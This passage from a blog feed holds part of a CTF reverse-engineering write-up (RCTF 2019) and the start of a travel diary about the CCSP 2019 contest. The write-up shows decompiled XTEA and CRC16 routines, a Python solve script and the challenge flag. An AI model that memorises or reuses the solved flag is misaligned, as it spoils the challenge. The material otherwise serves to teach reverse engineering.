class="number">1</span>) = v22;</span><br><span class="line">        v9 = v22;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v6 &gt; v14 );</span><br><span class="line">      v9 = *v7</span><br><span class="line">         + (((v22 ^ *(_DWORD *)(v3 + <span class="number">4L</span>L * (((<span class="keyword">unsigned</span> __int8)v6 ^ (<span class="keyword">unsigned</span> __int8)v11) &amp; <span class="number">3</span>))) + (*a1 ^ v8)) ^ ((<span class="number">4</span> * *a1 ^ (v22 &gt;&gt; <span class="number">5</span>)) + (<span class="number">16</span> * v22 ^ ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)*a1 &gt;&gt; <span class="number">3</span>))));</span><br><span class="line">      *v7 = v9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v8 != v45 );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt; <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v24 = -a2;</span><br><span class="line">    v25 = <span class="number">-1640531527</span> * (<span class="number">52</span> / v24 + <span class="number">6</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v25 )</span><br><span class="line">    &#123;</span><br><span class="line">      v26 = &amp;a1[v24 - <span class="number">1</span>];</span><br><span class="line">      v27 = ~v4;</span><br><span class="line">      v44 = &amp;a1[~v4];</span><br><span class="line">      v28 = ~v4 - <span class="number">2</span> - ((~v4 - <span class="number">3</span>) &amp; <span class="number">0xFFFFFFFE</span>);</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v29 = v25 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v27 &lt;= <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v31 = v27;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v30 = v44;</span><br><span class="line">          v31 = v27;</span><br><span class="line">          v32 = *v44;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            v33 = *(v30 - <span class="number">1</span>);</span><br><span class="line">            v30 -= <span class="number">2</span>;</span><br><span class="line">            v34 = v32;</span><br><span class="line">            v32 = *v30;</span><br><span class="line">            v35 = ((v5 ^ v25) + (v33 ^ *(_DWORD *)(v3 + <span class="number">4L</span>L * (((<span class="keyword">unsigned</span> __int8)v31 ^ (<span class="keyword">unsigned</span> __int8)v29) &amp; <span class="number">3</span>)))) ^ ((<span class="number">4</span> * v5 ^ (v33 &gt;&gt; <span class="number">5</span>)) + ((v5 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v33));</span><br><span class="line">            v36 = v31 - <span class="number">1</span>;</span><br><span class="line">            v31 -= <span class="number">2</span>;</span><br><span class="line">            v37 = v34 - v35;</span><br><span class="line">            v38 = *v30;</span><br><span class="line">            v30[<span class="number">2</span>] = v37;</span><br><span class="line">            v5 = v33</span><br><span class="line">               - (((<span class="number">16</span> * v38 ^ (v37 &gt;&gt; <span class="number">3</span>)) + ((v32 &gt;&gt; <span class="number">5</span>) ^ <span class="number">4</span> * v37)) ^ ((v32 ^ *(_DWORD *)(v3</span><br><span class="line">                                                                                         + <span class="number">4L</span>L</span><br><span class="line">                                                                                         * (((<span class="keyword">unsigned</span> __int8)v29 ^ v36) &amp; <span class="number">3</span>)))</span><br><span class="line">                                                                      + (v25 ^ v37)));</span><br><span class="line">            v30[<span class="number">1</span>] = v5;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v28 != v31 );</span><br><span class="line">        &#125;</span><br><span class="line">        v39 = &amp;a1[v31];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v40 = *(v39 - <span class="number">1</span>);</span><br><span class="line">          --v39;</span><br><span class="line">          v5 = v39[<span class="number">1</span>]</span><br><span class="line">             - (((v5 ^ v25) + (v40 ^ *(_DWORD *)(v3 + <span class="number">4L</span>L * (((<span class="keyword">unsigned</span> __int8)v29 ^ (<span class="keyword">unsigned</span> __int8)v31) &amp; <span class="number">3</span>)))) ^ (((v5 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v40) + ((v40 &gt;&gt; <span class="number">5</span>) ^ <span class="number">4</span> * v5)));</span><br><span class="line">          v39[<span class="number">1</span>] = v5;</span><br><span class="line">          --v31;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v31 );</span><br><span class="line">        v41 = *a1</span><br><span class="line">            - (((((<span class="keyword">unsigned</span> <span class="keyword">int</span>)*v26 &gt;&gt; <span class="number">5</span>) ^ <span class="number">4</span> * v5) + (<span class="number">16</span> * *v26 ^ (v5 &gt;&gt; <span class="number">3</span>))) ^ ((*(_DWORD *)(v3 + <span class="number">4L</span>L * (v29 &amp; <span class="number">3</span>)) ^ *v26)</span><br><span class="line">                                                                                 + (v25 ^ v5)));</span><br><span class="line">        v42 = v25 == <span class="number">-1640531527</span>;</span><br><span class="line">        v25 += <span class="number">1640531527</span>;</span><br><span class="line">        v5 = v41;</span><br><span class="line">        *a1 = v41;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( !v42 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由0x9E3779B9可知，这是一个xtea加密（解密）算法</p><p>然后加解密所使用的常数有所改变，是内存中的16字节的数组</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">xtea(v8, -(v10 &gt;&gt; <span class="number">2</span>), constant)</span><br></pre></td></tr></table></figure><blockquote><p>这个 -(v10 &gt;&gt; 2)明显是一个负数，而xtea函数为负时，就是解密的过程</p></blockquote><blockquote><p>在调试时xtea_keychanged这个函数执行完后就直接报wrong</p></blockquote><p>经高人指点，这个是xtea解密失败，程序判断这个密码解不出来，就直接报错了</p><h3 id="xtea-keychanged"><a href="#xtea-keychanged" class="headerlink" title="xtea_keychanged"></a>xtea_keychanged</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> *__<span class="function">fastcall <span class="title">xtea_keychanged</span><span class="params">(<span class="keyword">void</span> *src, <span class="keyword">int</span> const_8, __int64 a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// er12</span></span><br><span class="line">  __int64 constant; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">int</span> *<span class="built_in">string</span>; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> *v9; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// er12</span></span><br><span class="line"></span><br><span class="line">  v5 = a5;</span><br><span class="line">  <span class="keyword">if</span> ( !src || (v6 = const_8, const_8 &lt;= <span class="number">0</span>) || (constant = a3) == <span class="number">0</span> || a4 != <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !a5 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">string</span> = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( a5 )</span><br><span class="line">  &#123;</span><br><span class="line">    *a5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(const_8 &amp; <span class="number">3</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(const_8 + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">string</span> = v9;</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(v9, src, const_8);               <span class="comment">// v9 存储了输入的16进制数</span></span><br><span class="line">        v10 = const_8 + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt;= <span class="number">0</span> )</span><br><span class="line">          v10 = v6;</span><br><span class="line">        xtea(<span class="built_in">string</span>, -(v10 &gt;&gt; <span class="number">2</span>), constant);    <span class="comment">// xtea对输入的字符串进行解密</span></span><br><span class="line">        v11 = *((<span class="keyword">unsigned</span> __int8 *)<span class="built_in">string</span> + v6 - <span class="number">1</span>);<span class="comment">// 取第八个字符</span></span><br><span class="line">        *((_BYTE *)<span class="built_in">string</span> + v6) = <span class="number">0</span>;</span><br><span class="line">        *v5 = v6;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; v11 &amp;&amp; v11 &lt;= <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = v6 - v11;                       <span class="comment">// 8 - v11</span></span><br><span class="line">          *v5 = v13;</span><br><span class="line">          *((_BYTE *)<span class="built_in">string</span> + v13) = <span class="number">0</span>;         <span class="comment">// 把某一位置零了</span></span><br><span class="line">          <span class="keyword">return</span> <span class="built_in">string</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(<span class="built_in">string</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">    *v5 = <span class="number">0</span>;</span><br><span class="line">LABEL_14:</span><br><span class="line">    <span class="built_in">string</span> = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">*((_BYTE *)<span class="built_in">string</span> + v13) = <span class="number">0</span>;         <span class="comment">// 把某一位置零了</span></span><br></pre></td></tr></table></figure><p>这句话很关键，把某一位截断了，而这一位只能是倒数第二位</p><h3 id="crc16"><a href="#crc16" class="headerlink" title="crc16"></a>crc16</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_55883B5AF3D0</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r12</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  __int16 v4; <span class="comment">// ax</span></span><br><span class="line">  __int16 v5; <span class="comment">// ax</span></span><br><span class="line">  __int16 v6; <span class="comment">// dx</span></span><br><span class="line">  __int16 v7; <span class="comment">// ax</span></span><br><span class="line">  __int16 v8; <span class="comment">// dx</span></span><br><span class="line">  __int16 v9; <span class="comment">// ax</span></span><br><span class="line">  __int16 v10; <span class="comment">// dx</span></span><br><span class="line">  __int16 v11; <span class="comment">// ax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v13; <span class="comment">// [rsp+5h] [rbp-23h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v14; <span class="comment">// [rsp+6h] [rbp-22h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v15; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = a1;</span><br><span class="line">    v3 = a1 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a2 - <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v13 = *(_BYTE *)(++v2 - <span class="number">1</span>);</span><br><span class="line">        sub_55883B5AF270(&amp;v13, &amp;v13);</span><br><span class="line">        v4 = v14 ^ (v13 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> ( ((v14 ^ (v13 &lt;&lt; <span class="number">8</span>)) &amp; <span class="number">0x8000</span>u) != <span class="number">0</span> )</span><br><span class="line">          v5 = <span class="number">2</span> * v4 ^ <span class="number">0x1021</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v5 = <span class="number">2</span> * v4;</span><br><span class="line">        v6 = <span class="number">2</span> * v5 ^ <span class="number">0x1021</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 &gt;= <span class="number">0</span> )</span><br><span class="line">          v6 = <span class="number">2</span> * v5;</span><br><span class="line">        v7 = <span class="number">2</span> * v6 ^ <span class="number">0x1021</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt;= <span class="number">0</span> )</span><br><span class="line">          v7 = <span class="number">2</span> * v6;</span><br><span class="line">        v8 = <span class="number">2</span> * v7 ^ <span class="number">0x1021</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v7 &gt;= <span class="number">0</span> )</span><br><span class="line">          v8 = <span class="number">2</span> * v7;</span><br><span class="line">        v9 = <span class="number">2</span> * v8 ^ <span class="number">0x1021</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v8 &gt;= <span class="number">0</span> )</span><br><span class="line">          v9 = <span class="number">2</span> * v8;</span><br><span class="line">        v10 = <span class="number">2</span> * v9 ^ <span class="number">0x1021</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> )</span><br><span class="line">          v10 = <span class="number">2</span> * v9;</span><br><span class="line">        v11 = <span class="number">2</span> * v10 ^ <span class="number">0x1021</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v10 &gt;= <span class="number">0</span> )</span><br><span class="line">          v11 = <span class="number">2</span> * v10;</span><br><span class="line">        <span class="keyword">if</span> ( v11 &lt; <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v14 = <span class="number">2</span> * v11;</span><br><span class="line">        <span class="keyword">if</span> ( v2 == v3 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">      &#125;</span><br><span class="line">      v14 = <span class="number">2</span> * v11 ^ <span class="number">0x1021</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 != v3 );</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_19:</span><br><span class="line">  sub_55883B5AF2D0(&amp;v14, &amp;v14);</span><br><span class="line">  <span class="keyword">return</span> v14;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是通过0x1021可知，这是一个crc16校验，校验码为0x1021</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v2 == v3 )</span><br><span class="line">     <span class="keyword">goto</span> LABEL_19;</span><br></pre></td></tr></table></figure><p>由这句话可知，v2会从起始字节一直遍历到v3处，那么a2就要构造得刚好把这些值覆盖，可知a2=6，所以解密后的那个数组的最后一个字节就是2</p><p>调试tips:</p><blockquote><p> 有效的加密字符串 4290cd6dc6ae54cc</p><p>解密后得0123456789abcd02</p></blockquote><h3 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h3><ol><li>程序读入16位的十六进制数，并转化为8字节</li><li>将数据进行xtea解密</li></ol><blockquote><p>同时这个自带加密函数，只需要把输入的参数取反，就是逆过程了</p></blockquote><ol><li>将解密后的数据进行crc16校验（校验码为0x1021），得到结果<strong>0x69E2</strong></li><li>这个解密后的数组去异或0x17能得到”Bingo!” 字符串</li></ol><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc16</span><span class="params">(data: bytes, poly=<span class="number">0x1021</span>)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    CRC-16-CCITT Algorithm</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    data = bytearray(data)</span><br><span class="line">    crc = <span class="number">0xFFFF</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">        cur_byte = <span class="number">0xFF</span> &amp; b</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> (crc &amp; <span class="number">0x0001</span>) ^ (cur_byte &amp; <span class="number">0x0001</span>):</span><br><span class="line">                crc = (crc &gt;&gt; <span class="number">1</span>) ^ poly</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                crc &gt;&gt;= <span class="number">1</span></span><br><span class="line">            cur_byte &gt;&gt;= <span class="number">1</span></span><br><span class="line">    crc = (~crc &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">    crc = (crc &lt;&lt; <span class="number">8</span>) | ((crc &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> crc &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc = <span class="string">"Bingo!"</span></span><br><span class="line">dec = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    dec.append(hex(ord(i) ^ <span class="number">0x17</span>))</span><br><span class="line">dec.append(hex(<span class="number">6</span>))</span><br><span class="line">dec.append(hex(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">print(dec)</span><br></pre></td></tr></table></figure><blockquote><p>557e797078360602</p></blockquote><p>然后再拿这个字符串去加密一遍，就得到flag了</p><blockquote><p>rctf{2a2e71aab6168fb6}</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">11</span>] Accepting connection <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.133</span><span class="number">.1</span>...</span><br><span class="line">Input right flag you can got <span class="string">'Bingo!'</span> :<span class="number">2</span>a2e71aab6168fb6</span><br><span class="line"></span><br><span class="line">    Bingo!</span><br></pre></td></tr></table></figure><blockquote><p>后续：据说倒数第二字节是个padding</p><p>有空再填坑  <a href="https://blog.csdn.net/shift_wwx/article/details/84256774" target="_blank" rel="noopener">https://blog.csdn.net/shift_wwx/article/details/84256774</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="rctf-20190518" scheme="https://mrh1s.top/categories/write-up/rctf-20190518/"/>
    
    
      <category term="RE_Static" scheme="https://mrh1s.top/tags/RE-Static/"/>
    
      <category term="xtea" scheme="https://mrh1s.top/tags/xtea/"/>
    
      <category term="crc16" scheme="https://mrh1s.top/tags/crc16/"/>
    
  </entry>
  
  <entry>
    <title>ccsp2019西南赛区</title>
    <link href="https://mrh1s.top/posts/74b676c7/"/>
    <id>https://mrh1s.top/posts/74b676c7/</id>
    <published>2019-05-18T16:29:53.000Z</published>
    <updated>2019-05-18T17:17:17.499Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CCSP2019"><a href="#CCSP2019" class="headerlink" title="CCSP2019"></a>CCSP2019</h1><blockquote><p> 有幸通过了CCF CSP  认证，获得了参加CCSP西南赛区比赛的资格</p></blockquote><p><strong>来到川大（江安校区）</strong></p><p>这个校区管理非常严格，进门之前甚至需要出示身份证和准考证( x</p><p>校园中一片宁静，可能是因为星期六的原因，并没有太多人愿意在这个搭好的天气出来走动走动，偶尔看见一两对情侣唧唧我我，酸死我了</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/05/19/5ce039812509636998.jpg" alt="MVIMG_20190518_165030.jpg"></p><p>人文气息极其浓厚</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/05/19/5ce03985947f538834.jpg" alt="MVIMG_20190518_162435.jpg"></p><p>这个比赛并不是很出名，整个教学楼就只看到两个指示牌，这是其中一个（</p><p><img 